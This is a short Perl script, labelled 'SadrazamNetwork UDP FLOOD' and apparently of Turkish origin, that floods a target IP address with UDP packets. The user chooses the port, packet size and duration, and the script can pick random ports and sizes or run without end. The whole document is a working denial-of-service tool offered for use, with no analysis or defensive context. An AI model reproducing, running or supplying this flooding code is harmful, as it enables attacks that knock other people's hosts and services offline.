#!/usr/bin/perl
##############
#SadrazamNetwork UDP FLOOD.
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "wwx.pl <ip> <port> <paket> <süre>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Host adı çözü $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Saldırılan İp adresi $ip " . ($port ? $port : "random") . " Port " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}